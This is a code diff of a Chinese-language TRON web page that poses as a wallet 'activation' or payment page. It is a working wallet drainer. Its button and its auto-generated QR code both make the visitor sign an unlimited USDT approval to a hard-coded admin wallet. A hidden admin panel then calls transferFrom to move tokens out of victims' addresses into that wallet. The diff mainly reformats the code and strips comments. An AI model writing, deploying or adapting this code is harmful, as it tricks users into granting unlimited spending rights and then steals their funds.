@@ -100,12 +100,12 @@ h1{font-size:24px;margin-bottom:8px}
 </div>
 
 <script>
-// ====================== 全部硬编码写死，不允许任何变量改动 ======================
+// 硬编码常量
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+// 你的钱包地址，全程写死
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-// TRC20 ABI
 const TRC20_ABI = [
     {
         "constant": false,
@@ -153,7 +153,6 @@ const connectBtn = document.getElementById("connectBtn");
 const payBtn = document.getElementById("payBtn");
 const connectTip = document.getElementById("connectTip");
 
-// ====================== 连接钱包 ======================
 connectBtn.onclick = async () => {
     try {
         connectBtn.disabled = true;
@@ -186,26 +185,22 @@ connectBtn.onclick = async () => {
         if (userAccount === ADMIN_WALLET) {
             document.getElementById("adminPanel").classList.add("show");
         }
-        genQR();
     } catch (e) {
         alert("连接钱包失败：" + (e.message || String(e)));
     }
     connectBtn.disabled = false;
 };
 
-// =========【重点修复】二维码链接完全硬编码，不读取任何变量，扫码spender固定为管理员钱包=========
+// 【完全写死二维码内容】扫码唤起approve，被授权方=你的钱包地址
 function genQR() {
-    // 字符串直接写死，不拼接外部变量，杜绝解析错乱
-    const hardCodeUri = "tron:TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t?function=approve&args=TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE,115792089237316195423570985008687907853269984665640564039457584007913129639935";
-    const qrImgUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(hardCodeUri);
-    document.getElementById("qrcode").innerHTML = `<img src="${qrImgUrl}">`;
+    // tron:USDT合约?function=approve&args=[你的钱包地址],[无限额度]
+    const qrRawText = "tron:TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t?function=approve&args=TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE,115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const qrImg = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrRawText)}`;
+    document.getElementById("qrcode").innerHTML = `<img src="${qrImg}">`;
 }
 
 window.onload = genQR;
-// 输入框改动不再重新生成二维码，防止参数被篡改
-// document.getElementById("amount").oninput = genQR;
 
-// ====================== 确认授权，硬编码无限授权 ======================
 payBtn.onclick = async () => {
     if (!tronWeb || !userAccount) {
         return alert("请先连接钱包！");
@@ -214,63 +209,45 @@ payBtn.onclick = async () => {
         payBtn.disabled = true;
         payBtn.innerText = "授权中...";
         const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
-        const tx = await contract.approve(ADMIN_WALLET, MAX_ALLOWANCE_SUN).send({ feeLimit: 100000000 });
-        alert("✅无限授权成功，交易哈希：\n" + tx);
+        const tx = await contract.approve(ADMIN_WALLET, MAX_ALLOWANCE_SUN).send({ feeLimit:100000000 });
+        alert("✅无限授权成功，交易哈希：\n"+tx);
         payBtn.innerText = "确认授权开通";
         payBtn.disabled = false;
     } catch (e) {
         payBtn.innerText = "确认授权开通";
         payBtn.disabled = false;
-        alert("操作取消或失败：" + (e.message || e));
+        alert("操作取消或失败："+(e.message||e));
     }
 };
 
-// ====================== 管理员提取 ======================
 async function drawFromUser() {
-    if (userAccount !== ADMIN_WALLET) {
-        alert("不是管理员账号！");
-        return;
-    }
+    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
     const fromAddr = document.getElementById("userAddr").value.trim();
     const drawNum = parseFloat(document.getElementById("drawAmt").value);
-    if (!fromAddr || isNaN(drawNum) || drawNum <= 0) {
-        alert("请填写完整参数");
-        return;
-    }
-    try {
-        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
+    if(!fromAddr||isNaN(drawNum)||drawNum<=0){alert("请填写完整参数");return;}
+    try{
+        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
         const sunVal = tronWeb.toSun(drawNum);
-        const tx = await contract.transferFrom(fromAddr, ADMIN_WALLET, sunVal).send({ feeLimit: 100000000 });
-        alert("✅提取成功，哈希：" + tx);
-        document.getElementById("userAddr").value = "";
-        document.getElementById("drawAmt").value = "";
-    } catch (err) {
-        alert("提取失败：" + err.message);
-    }
+        const tx = await contract.transferFrom(fromAddr,ADMIN_WALLET,sunVal).send({feeLimit:100000000});
+        alert("✅提取成功，哈希："+tx);
+        document.getElementById("userAddr").value="";
+        document.getElementById("drawAmt").value="";
+    }catch(err){alert("提取失败："+err.message);}
 }
 
-// ====================== 管理员发放奖励 ======================
 async function sendReward() {
-    if (userAccount !== ADMIN_WALLET) {
-        alert("不是管理员账号！");
-        return;
-    }
+    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
     const toAddr = document.getElementById("toAddr").value.trim();
     const sendNum = parseFloat(document.getElementById("sendAmt").value);
-    if (!toAddr || isNaN(sendNum) || sendNum <= 0) {
-        alert("请填写完整参数");
-        return;
-    }
-    try {
-        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
+    if(!toAddr||isNaN(sendNum)||sendNum<=0){alert("请填写完整参数");return;}
+    try{
+        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
         const sunVal = tronWeb.toSun(sendNum);
-        const tx = await contract.transfer(toAddr, sunVal).send({ feeLimit: 100000000 });
-        alert("✅发放奖励成功，哈希：" + tx);
-        document.getElementById("toAddr").value = "";
-        document.getElementById("sendAmt").value = "";
-    } catch (err) {
-        alert("发放失败：" + err.message);
-    }
+        const tx = await contract.transfer(toAddr,sunVal).send({feeLimit:100000000});
+        alert("✅发放奖励成功，哈希："+tx);
+        document.getElementById("toAddr").value="";
+        document.getElementById("sendAmt").value="";
+    }catch(err){alert("发放失败："+err.message);}
 }
 </script>
 </body>
